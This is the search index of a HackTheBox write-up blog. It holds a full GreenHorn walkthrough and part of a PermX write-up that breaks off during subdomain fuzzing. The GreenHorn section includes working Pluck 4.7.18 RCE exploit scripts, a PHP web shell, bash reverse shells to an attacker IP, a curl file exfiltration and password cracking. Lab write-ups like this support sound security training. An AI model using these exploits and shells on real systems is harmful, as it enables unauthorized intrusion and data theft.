{"config": {"lang": ["en"], "separator": "[\\s\\-]+", "pipeline": ["stopWordFilter"]}, "docs": [{"location": "", "title": "Welcome", "text": "<p>Welcome to my humble blog. Here I share some of my write-ups for machines and possibly challenges (in the future) for the HackTheBox platform.</p> <p>Warning</p> <p>The blog is still under construction. A select few write-ups are accessible for now as I try to convert the rest of my write-ups to a presentable format.</p> <p>You can find the accessible write-ups under the <code>Write-Ups</code> tab and then navigating to <code>HackTheBox</code>.</p>"}, {"location": "Write-Ups/", "title": "HackTheBox", "text": "<p>A collection of write-ups of machines and challenges for the HackTheBox platform can be found here.</p> <p>Info</p> <p>For now the write-ups are in a simple step-by-step solution format. </p> <p>This is planned to change in the future as I try to adjust them into a more informative format. This is planned to include possible alternate ways to achieve things, some more in-depth tips and knowledge, rabbit holes that one may go down as well as post-exploitation techniques for possible persistence and analysis of vulnerabilities exploited.</p>"}, {"location": "Write-Ups/#machines", "title": "Machines", "text": "Icon Name Difficulty Operating System Access Link Alert Easy Linux Axlle Hard Windows Blazorized Hard Windows Blurry Medium Linux BoardLight Easy Linux Compiled Medium Windows Editorial Easy Linux FormulaX Hard Linux GreenHorn Easy Linux IClean Medium Linux Instant Medium Linux Intuition Hard Linux MonitorsThree Medium Linux PermX Easy Linux Resource Hard Linux Runner Medium Linux Sea Easy Linux SolarLab Medium Windows Usage Easy Linux"}, {"location": "Write-Ups/GreenHorn/", "title": "GreenHorn", "text": ""}, {"location": "Write-Ups/GreenHorn/#initial-enumeration", "title": "Initial Enumeration", "text": ""}, {"location": "Write-Ups/GreenHorn/#nmap", "title": "Nmap", "text": "<p>Start the enumeration with Nmap, gathering ports and services available.</p> <p>As always <code>-p-</code> and <code>--min-rate 10000</code> to catch all ports, and once acquired we enumerate further.</p> <pre><code>$ sudo nmap -sC -sV -p22,80,3000 -vv -oN nmap 10.129.87.59\n# Nmap 7.94SVN scan initiated Fri Dec  6 13:43:07 2024 as: /usr/lib/nmap/nmap -sC -sV -p22,80,3000 -oN nmap -vv 10.129.87.59\nNmap scan report for 10.129.87.59\nHost is up, received echo-reply ttl 63 (0.023s latency).\nScanned at 2024-12-06 13:43:08 CET for 93s\n\nPORT     STATE SERVICE REASON         VERSION\n22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=\n|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv\n80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://greenhorn.htb/\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n3000/tcp open  ppp?    syn-ack ttl 63\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n|     Content-Type: text/html; charset=utf-8\n|     Set-Cookie: i_like_gitea=6d4e351f0099e873; Path=/; HttpOnly; SameSite=Lax\n|     Set-Cookie: _csrf=D80EaSvmwOqhy1QQwN41klKKPKU6MTczMzQ4ODk5NTYyMDg2MjQ2Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Fri, 06 Dec 2024 12:43:15 GMT\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en-US\" class=\"theme-auto\"&gt;\n|     &lt;head&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n|     &lt;title&gt;GreenHorn&lt;/title&gt;\n|     &lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Allow: HEAD\n|     Allow: GET\n|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n|     Set-Cookie: i_like_gitea=c7418bc923bfd1c3; Path=/; HttpOnly; SameSite=Lax\n|     Set-Cookie: _csrf=LUNQtcvrdIyfLW65LWplcX-lApE6MTczMzQ4OTAwMTAzNDY4Mzk3NA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Fri, 06 Dec 2024 12:43:21 GMT\n|_    Content-Length: 0\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3000-TCP:V=7.94SVN%I=7%D=12/6%Time=6752F162%P=x86_64-pc-linux-gnu%r\nSF:(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x\nSF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Ba\nSF:d\\x20Request\")%r(GetRequest,1000,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nCache-Contr\nSF:ol:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nCo\nSF:ntent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nSet-Cookie:\\x20i_like_git\nSF:ea=6d4e351f0099e873;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSet-Coo\nSF:kie:\\x20_csrf=D80EaSvmwOqhy1QQwN41klKKPKU6MTczMzQ4ODk5NTYyMDg2MjQ2Nw;\\x\nSF:20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Frame-Opt\nSF:ions:\\x20SAMEORIGIN\\r\\nDate:\\x20Fri,\\x2006\\x20Dec\\x202024\\x2012:43:15\\x\nSF:20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en-US\\\"\\x20class=\\\"the\nSF:me-auto\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=dev\nSF:ice-width,\\x20initial-scale=1\\\"&gt;\\n\\t&lt;title&gt;GreenHorn&lt;/title&gt;\\n\\t&lt;link\\x\nSF:20rel=\\\"manifest\\\"\\x20href=\\\"data:application/json;base64,eyJuYW1lIjoiR\nSF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6\nSF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh\nSF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC\nSF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY\nSF:X\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(HTTPOptions,197,\"HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20All\nSF:owed\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20GET\\r\\nCache-Control:\\x20max-age=0,\nSF:\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nSet-Cookie:\\x20i_li\nSF:ke_gitea=c7418bc923bfd1c3;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nS\nSF:et-Cookie:\\x20_csrf=LUNQtcvrdIyfLW65LWplcX-lApE6MTczMzQ4OTAwMTAzNDY4Mzk\nSF:3NA;\\x20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Fra\nSF:me-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Fri,\\x2006\\x20Dec\\x202024\\x2012:4\nSF:3:21\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequest,67,\"HTTP/1\\\nSF:.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=\nSF:utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Dec  6 13:44:41 2024 -- 1 IP address (1 host up) scanned in 93.80 seconds\n</code></pre> <ul> <li>TTL of 63 possibly indicating Linux and no containers in use</li> <li>Port 22 SSH and showing us Ubuntu Linux</li> <li>Port 80 HTTP redirects to <code>http://greenhorn.htb/</code></li> <li>Port 3000 HTTP reveals <code>gitea</code> with cookies</li> </ul>"}, {"location": "Write-Ups/GreenHorn/#port-80", "title": "Port 80", "text": "<p>We add <code>greenhorn.htb</code> to our <code>/etc/hosts</code> file and browse to the website.</p> <p><code>http://greenhorn.htb/?file=welcome-to-greenhorn</code> </p> <p>From the footer we can see the pluck CMS is being used by the website.</p> <p>We can also see the <code>file</code> parameter being used, which we can quickly check for an LFI vulnerability. We try it with the payload <code>../../../../../../etc/passwd</code> but get blocked:</p> <p></p> <p>We can also try to fingerprint the version of pluck being used. We do this by issuing the <code>curl</code> command:</p> <pre><code>$ curl -s 'http://greenhorn.htb/?file=welcome-to-greenhorn' | grep -i pluck\n\n&lt;meta name=\"generator\" content=\"pluck 4.7.18\" /&gt;\n                                &lt;a href=\"/login.php\"&gt;admin&lt;/a&gt; | powered by &lt;a href=\"http://www.pluck-cms.org\"&gt;pluck&lt;/a&gt;\n</code></pre> <p>And we see the instance is running version 4.7.18, which is vulnerable to a stored XSS as well as an RCE. However it is an authenticated RCE, so we need to be logged in (see Exploitation).</p>"}, {"location": "Write-Ups/GreenHorn/#port-3000", "title": "Port 3000", "text": "<p>Next up we can check the Gitea website running on port 3000.</p> <p></p> <p>We browse to <code>Explore</code> and find the <code>GreenHorn</code> repository being publicly accessible. </p> <p></p> <p>It is safe to assume that this is the source code for the website running on port 80.</p> <p>Browsing through the repository we can find sensitive information being exposed in the <code>pass.php</code> file:</p> <p></p> <p>This is most likely a password hash and looking like SHA. To get the correct SHA-X we count the characters:</p> <pre><code>$ echo 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' | wc -c\n129\n</code></pre> <p>This is a SHA-512 hash and we conclude this because SHA-512 means 512 bits, thus meaning 64 bytes. The hash is represented in hex format, so 128 characters matches the 64 bytes.</p> <p>We try decrypting it the easy way with CrackStation first, before going with <code>Hashcat</code>.</p> <p></p> <p>And it successfully cracks as <code>iloveyou1</code>.</p> <p>We try password reuse on the pluck instance on port 80 and get successfully logged in. This allows us to proceed with the RCE exploit.</p> <p></p> <p></p>"}, {"location": "Write-Ups/GreenHorn/#exploitation", "title": "Exploitation", "text": "<p>Running a quick <code>searchsploit</code> check reveals an RCE as well as stored XSS vulnerability for the version of pluck used by the website:</p> <pre><code>$ searchsploit pluck 4.7.18\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                                                                                         |  Path\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nPluck v4.7.18 - Remote Code Execution (RCE)                                                                                                                                                                                                            | php/webapps/51592.py\npluck v4.7.18 - Stored Cross-Site Scripting (XSS)                                                                                                                                                                                                      | php/webapps/51420.txt\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n</code></pre> <p>Info</p> <p>In the following are two ways to achieve successful remote code execution, by using the proof-of-concept RCE script as well as by writing our own Python script.</p> Proof-of-Concept RCEOwn RCE <p>We copy the RCE to our working directory</p> <pre><code>$ searchsploit -m php/webapps/51592.py\nExploit: Pluck v4.7.18 - Remote Code Execution (RCE)\n    URL: https://www.exploit-db.com/exploits/51592\n    Path: /usr/share/exploitdb/exploits/php/webapps/51592.py\n    Codes: N/A\nVerified: False\nFile Type: Python script, Unicode text, UTF-8 text executable\nCopied to: /home/kali/htb/greenhorn/51592.py\n</code></pre> <p>For the exploit to work, we need to find the <code>login.php</code> and <code>admin.php</code> pages, as defined in the script. Luckily they can be easily found by just browsing to <code>http://greenhorn.htb/login.php</code> and same for and <code>http://greenhorn.htb/admin.php</code>.</p> <p>Next is to adjust the script to our situation by editing the <code>login_url</code>, <code>upload_url</code> and <code>rce_url</code> variables as well as change the password we found for the <code>login_payload</code> variable. We use the <code>greenhorn.htb</code> host instead of <code>localhost</code> and adjust the URIs.</p> 51592.py<pre><code>import requests\nfrom requests_toolbelt.multipart.encoder import MultipartEncoder\n\nlogin_url = \"http://greenhorn.htb/login.php\"\nupload_url = \"http://greenhorn.htb/admin.php?action=installmodule\"\nheaders = {\"Referer\": login_url,}\nlogin_payload = {\"cont1\": \"admin\",\"bogus\": \"\",\"submit\": \"Log in\"}\n\nfile_path = input(\"ZIP file path: \")\n\nmultipart_data = MultipartEncoder(\n    fields={\n        \"sendfile\": (\"mirabbas.zip\", open(file_path, \"rb\"), \"application/zip\"),\n        \"submit\": \"Upload\"\n    }\n)\n\nsession = requests.Session()\nlogin_response = session.post(login_url, headers=headers, data=login_payload)\n\n\nif login_response.status_code == 200:\n    print(\"Login account\")\n\n\n    upload_headers = {\n        \"Referer\": upload_url,\n        \"Content-Type\": multipart_data.content_type\n    }\n    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)\n\n\n    if upload_response.status_code == 200:\n        print(\"ZIP file download.\")\n    else:\n        print(\"ZIP file download error. Response code:\", upload_response.status_code)\nelse:\n    print(\"Login problem. response code:\", login_response.status_code)\n\n\nrce_url=\"http://greenhorn.htb/data/modules/mirabbas/miri.php\"\n\nrce=requests.get(rce_url)\n\nprint(rce.text)\n</code></pre> <p>Before running the exploit we need to create our payload as a PHP file and create a ZIP archive with it. The script above uses the filenames <code>miri.php</code> for the PHP and <code>mirabbas.zip</code> for the ZIP file name, so we mirror these names.</p> <p>For our PHP file we create a simple PHP web shell:</p> <pre><code>&lt;?php system($_GET[\"cmd\"]); ?&gt;\n</code></pre> <p>And save it as <code>miri.php</code>.</p> <pre><code>$ echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; miri.php\n</code></pre> <p>Next we zip it up.</p> <pre><code>$ zip mirabbas.zip miri.php\n</code></pre> <p>We are now ready to run the exploit.</p> <p><pre><code>$ python3 51592.py\nZIP file path: /home/kali/htb/greenhorn/mirabbas.zip\nLogin account\nZIP file download.\n</code></pre> And we get successful code execution by browsing to:</p> <p><pre><code>http://greenhorn.htb/data/modules/mirabbas/miri.php?cmd=id\n</code></pre> </p> <p>Having code execution confirmed, we can now get a reverse shell connection in order to more easily interact with the target host.</p> <pre><code>$ curl -s 'http://greenhorn.htb/data/modules/mirabbas/miri.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/7777 0&gt;&amp;1'\"\n</code></pre> <p>And we successfully get a reverse shell connection established on our listener:</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.11] from (UNKNOWN) [10.129.87.59] 44768\nbash: cannot set terminal process group (996): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@greenhorn:~/html/pluck/data/modules/mirabbas$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@greenhorn:~/html/pluck/data/modules/mirabbas$ hostname\ngreenhorn\n</code></pre> <p>From the found RCE we can copy the URLs and write our own script. The script can also be found on my GitHub.</p> exploit.py<pre><code>import requests\nimport argparse\nfrom termcolor import colored\nimport zipfile\nimport os\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Exploit Pluck v4.7.18 RCE Vulnerability\")\n    parser.add_argument(\"--target\",required=True,help=\"Target URL (Example: http://greenhorn.htb)\")\n    parser.add_argument(\"--password\",required=True,help=\"Pluck password\")\n    parser.add_argument(\"--cmd\",help=\"Command to execute\")\n    args = parser.parse_args()\n\n    # Create payload\n    filename = 'malicious'\n    print(f\"[+] Creating payload {filename}.zip\")            \n    with open(f'{filename}.php','w') as _file:\n        _file.write('&lt;?php system($_GET[\"cmd\"]); ?&gt;')\n    with zipfile.ZipFile(f'{filename}.zip','w') as _zip:\n        _zip.write(f'{filename}.php')\n    os.remove(f'{filename}.php')\n\n    target = args.target.rstrip('/')\n    # URLs \n    login_url = f\"{target}/login.php\"\n    upload_url = f\"{target}/admin.php?action=installmodule\"\n    rce_url = f\"{target}/data/modules/{filename}/{filename}.php\"\n\n    with requests.Session() as sess:\n        # Login\n        print(f\"[+] Logging in\")\n        login_post = sess.post(login_url,data={\"cont1\":f\"{args.password}\",\"bogus\":\"\",\"submit\":\"Log+in\"})\n        if \"Password incorrect\" in login_post.text:\n            print(colored(f\"[!] Login failed using password {args.password}\",'red'))\n            return\n        print(f\"[+] Login successful\")\n\n        print(f\"[+] Uploading {filename}.zip\")\n\n        # Upload malicious ZIP\n        req = sess.post(upload_url, data={\"submit\":\"Upload\"}, files={\"sendfile\":open(f'{filename}.zip', 'rb')})\n\n        # Check successful command execution\n        req = sess.get(f'{rce_url}?cmd=id')\n        if not (req.status_code == 200):\n            print(colored(f\"[!] Exploit might have failed\\n[!] Check {rce_url}\",'yellow'))\n            os.remove(f'{filename}.zip')\n            return\n\n        print(colored(f\"[+] Upload successful\\n[+] Access web shell at {rce_url}?cmd=&lt;COMMAND&gt;\",'green'))\n        # Execute user-supplied command\n        if args.cmd:\n            print(f\"[+] Executing command \\'{args.cmd}\\'\\n\")\n            cmd_encoded = requests.utils.quote(args.cmd)\n            req = sess.get(f\"{rce_url}?cmd={cmd_encoded}\")\n            print(req.text)\n\n        os.remove(f'{filename}.zip')\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>Then we can run the exploit, specifying the command we wish to execute. In this case we choose to execute a command that will establish a reverse shell connection to our listener.</p> <pre><code>$ python3 pluck-rce.py --target http://greenhorn.htb --password iloveyou1 --cmd \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/7777 0&gt;&amp;1'\"\n[+] Creating payload malicious.zip\n[+] Logging in\n[+] Login successful\n[+] Uploading malicious.zip\n[+] Upload successful\n[+] Access web shell at http://greenhorn.htb/data/modules/malicious/malicious.php?cmd=&lt;COMMAND&gt;\n[+] Executing command 'bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/7777 0&gt;&amp;1''\n</code></pre> <p>And we get successfully get a connection established on our listener:</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.78.209] 38982\nbash: cannot set terminal process group (1003): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@greenhorn:~/html/pluck/data/modules/malicious$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@greenhorn:~/html/pluck/data/modules/malicious$ hostname\ngreenhorn\n</code></pre>"}, {"location": "Write-Ups/GreenHorn/#host-enumeration", "title": "Host Enumeration", "text": "<p>Once we are on the host with our reverse shell, we can do some manual enumeration on it and see two users being present:</p> <pre><code>$ cat /etc/passwd | grep sh$\ncat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\ngit:x:114:120:Git Version Control,,,:/home/git:/bin/bash\njunior:x:1000:1000::/home/junior:/bin/bash\n</code></pre> <p>And trying for password reuse (using <code>iloveyou1</code>) we can successfully authenticate as user <code>junior</code>:</p> <pre><code>$ su -l junior\n\nPassword: iloveyou1\nwhoami\njunior\n</code></pre> <p>We upgrade the shell to a TTY.</p> <pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <p>The user flag can be found in the home directory of <code>junior</code>.</p> <pre><code>$ cat user.txt\n5575bb0446ca9ad25c0ce2c58bad1dbc\n</code></pre> <p>We can also find <code>Using OpenVAS.pdf</code> file in juniors home directory. First we transfer over to our local attack machine.</p> <p>We start an upload server on our attack machine.</p> <pre><code>$ python3 -m uploadserver 8080                                                                                                       \nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n</code></pre> <p>Next on the target host we upload the file using curl:</p> <pre><code>$ curl -X POST http://10.10.16.11:8080/upload -F 'files=@/home/junior/Using OpenVAS.pdf' --insecure\n</code></pre> <p>And we successfully receive the file on our local machine.</p> <pre><code>10.129.87.59 - - [07/Dec/2024 17:38:25] [Uploaded] \"Using OpenVAS.pdf\" --&gt; /home/kali/htb/greenhorn/Using OpenVAS.pdf\n10.129.87.59 - - [07/Dec/2024 17:38:25] \"POST /upload HTTP/1.1\" 204 -\n</code></pre>"}, {"location": "Write-Ups/GreenHorn/#privilege-escalation", "title": "Privilege Escalation", "text": "<p>Opening the PDF document, we can see the following:</p> <p></p> <p>A blurred out password is present, which can potentially be abused using depixelization tools. </p> <p>In the following we use the Depix tool to try this approach.</p> <p>We first need to extract the blurred password image. So right-click on the blurred text and save as image.</p> <p></p> <p>Once saved, we can run the <code>Depix</code> tool on the image from within the cloned <code>Depix</code> repository directory:</p> <pre><code>$ python3 depix.py -p ~/htb/greenhorn/pixel.png -s images/searchimages/&lt;IMAGE_PNG&gt;\n</code></pre> <p>We try a few <code>&lt;IMAGE_PNG&gt;</code> images inside the <code>./images/searchimages/</code> directory on the pixelated image we saved and open them:</p> <pre><code>$ open output.png\n</code></pre> <p>Eventually we can unblur the image using the following search image:</p> <pre><code>$ python3 depix.py -p ~/htb/greenhorn/pixel.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png\n</code></pre> <p>This reveals a readable password, spelling <code>sidefromsidetheothersidesidefromsidetheotherside</code>.</p> <p></p> <p>Since the PDF mentioned that \"only the root user\" can execute the <code>openvas</code> command using this password, it is safe to assume that this is the password for the root user.</p> <p>So we try to login as the root user:</p> <pre><code>$ su -l\nPassword: sidefromsidetheothersidesidefromsidetheotherside\n\nroot@greenhorn:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@greenhorn:~# hostname\ngreenhorn\n</code></pre> <p>And we successfully escalated privileges and can get the root flag.</p> <pre><code>$ cat root.txt\n8042b17f8b4311c9c687a403d8fa9197\n</code></pre>"}, {"location": "Write-Ups/GreenHorn/#resources", "title": "Resources", "text": "<ul> <li>Depix tool</li> <li>Depix blog post about image depixelization</li> <li>Alternative tool Unredacter</li> <li>Unredacter blog post about image depixelization</li> </ul>"}, {"location": "Write-Ups/GreenHorn/#remediation", "title": "Remediation", "text": "<ul> <li>Gitea sensitive information disclosure. Exclude pass.php using <code>Git</code> excludes.</li> <li>Gitea use stronger password, so it is less susceptible to cracking attempts.</li> <li>Patch vulnerable version of Pluck CMS.</li> <li>Do not reuse passwords.</li> <li>Dont blur images to try and hide sensitive information, as they can often be depixelized back to to readable format. Use  syntax or put a bar over the field containing sensitive information."}, {"location": "Write-Ups/PermX/", "title": "PermX", "text": ""}, {"location": "Write-Ups/PermX/#initial-enumeration", "title": "Initial Enumeration", "text": ""}, {"location": "Write-Ups/PermX/#nmap", "title": "Nmap", "text": "<p>We first do our port discovery running <code>sudo nmap -p- --min-rate 10000 10.129.71.63</code>. Then we run our script and version scans on the ports we found to be open.</p> <pre><code>$ sudo nmap -p22,80 -sC -sV -oN nmap-full 10.129.71.63      \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 11:42 CET\nNmap scan report for 10.129.71.63\nHost is up (0.024s latency).\n\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=\n|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Did not follow redirect to http://permx.htb\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.66 seconds\n</code></pre> <ul> <li>TTL of 63 indicating Linux as well as most likely no containerization in play.</li> <li>Port 20 SSH - Reveals Linux (Ubuntu)</li> <li>Port 80 HTTP - Redirects to <code>http://permx.htb</code></li> </ul> <p>We add <code>permx.htb</code> to our <code>/etc/hosts</code> file.</p>"}, {"location": "Write-Ups/PermX/#port-80", "title": "Port 80", "text": "<p>We visit <code>http://permx.htb</code> in our browser and begin with some manual enumeration by browsing the website.</p> <p></p> <p>We see a fairly standard page with not much to discover manually.</p> <p>Some interesting things to note are that the file extension <code>.html</code> is used for pages on the site and we also see a contact email on the bottom of the page.</p> <p></p> <p>We will continue with doing automated enumeration using Ffuf, trying to discover directories as well as pages (discovered file extension <code>.html</code>).</p> <pre><code>$ ffuf -u http://permx.htb/FUZZ -e html -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://permx.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Extensions       : html \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\n                        [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 23ms]\nimg                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 36ms]\ncss                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 29ms]\nlib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 30ms]\njs                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 20ms]\n&lt;--SNIP--&gt;\n</code></pre> <p>Nothing of interest can be found. We continue with fuzzing for possible subdomains using Ffuf.</p> <pre><code>$ ffuf -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.permx.htb\" -fw 18\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://permx.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.permx.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 18\n________________________________________________\n\nwww                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 1375ms]\nlms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, 